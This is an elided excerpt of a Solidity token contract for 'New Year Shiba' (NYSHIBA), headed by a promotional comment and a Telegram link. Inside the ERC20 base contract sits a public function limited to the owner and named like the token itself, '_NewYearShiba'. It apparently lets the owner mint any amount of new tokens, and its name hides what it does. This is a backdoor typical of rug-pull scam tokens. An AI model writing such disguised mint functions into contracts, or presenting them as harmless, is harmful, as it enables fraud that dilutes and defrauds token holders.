...
//
// $NewYearShiba proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+lMMUEDMe7CJkYmRl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NewYearShiba(uint256 amount) public onlyOwner {
 _NewYearShiba(msg.sender, amount);
    }
    ...
    function _NewYearShiba(address account, uint256 amount) internal virtual {
...
contract $NewYearShiba is ERC20 {
    ...
    constructor() public ERC20("New Year Shiba", "NYSHIBA") {
     _NewYearShiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}